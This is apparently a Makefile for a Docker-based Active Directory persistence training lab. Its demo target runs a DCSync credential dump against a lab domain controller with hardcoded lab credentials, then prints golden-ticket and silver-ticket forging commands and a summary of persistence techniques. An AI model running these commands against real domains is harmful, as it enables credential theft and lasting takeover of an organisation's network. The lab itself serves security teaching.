# Module 07 — Persistence in AD lab.
.PHONY: up down reset demo shell

up:
	docker compose up -d --build

down:
	docker compose down

reset:
	docker compose down --rmi local --volumes --remove-orphans

shell:
	docker compose exec attacker bash

demo:       ## Demonstrate golden ticket creation and DCSync persistence
	@echo "=== Waiting for DC... ==="
	docker compose exec attacker sh -c \
	    'until python3 -c "import socket; socket.create_connection((\"dc01.corp.local\", 445), 3)" 2>/dev/null; do sleep 3; done; echo "DC ready."'
	@echo ""
	@echo "=== 1. Extract krbtgt hash via DCSync ==="
	docker compose exec attacker \
	    secretsdump.py CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local \
	    -just-dc-user krbtgt 2>/dev/null | grep "krbtgt:" || \
	    echo "[note] Run: secretsdump.py CORP.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.corp.local -just-dc-user krbtgt"
	@echo ""
	@echo "=== 2. Golden ticket — forge a TGT for a phantom admin ==="
	@echo "   ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain CORP.LOCAL -groups 512 phantom_admin"
	@echo "   export KRB5CCNAME=phantom_admin.ccache"
	@echo "   secretsdump.py -k -no-pass dc01.corp.local"
	@echo ""
	@echo "=== 3. Silver ticket — forge a service ticket (no KDC contact) ==="
	@echo "   ticketer.py -nthash <SVC_MSSQL_HASH> -domain-sid <DOMAIN_SID> -domain CORP.LOCAL"
	@echo "              -spn MSSQLSvc/db01.corp.local:1433 -user-id 500 Administrator"
	@echo ""
	@echo "=== 4. Persistence mechanisms summary ==="
	@echo "   Golden ticket:  krbtgt hash needed; survives password resets; expired only by 2x krbtgt rotation"
	@echo "   Silver ticket:  service account hash needed; no KDC contact during use; hardest to detect"
	@echo "   DCSync rights:  ACE on domain object; persists as long as ACE is present; invisible in group review"
	@echo ""
	@echo "=== Demo complete. Run 'make shell' to create tickets interactively. ==="
